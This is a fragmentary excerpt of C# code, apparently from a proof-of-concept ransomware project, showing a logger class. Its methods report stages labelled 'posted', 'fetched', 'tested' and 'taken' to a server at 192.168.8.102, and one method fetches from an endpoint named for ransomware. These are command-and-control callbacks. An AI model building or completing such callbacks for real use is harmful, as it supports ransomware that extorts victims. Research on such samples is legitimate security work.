...
namespace Shannon10POC.ShannonLogger
{
    class Logger
    {
        ...
        public static async void postPoCPosted()
        {
            ...
            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postsh10posted", content).Result;
            var result = await response.Content.ReadAsByteArrayAsync();
        }

        public static void getPoCRansomware()
        {
            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/getsh10ransomware").Result;
        ...
        public static async void postPoCFetched()
        {
            ...
            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postsh10fetched", content).Result;
        ...
        public static async void postPoCTested()
        {
            ...
            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postsh10tested", content).Result;
        ...
        public static async void postPoCTaken()
        {
            ...
            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postsh10taken", content).Result;
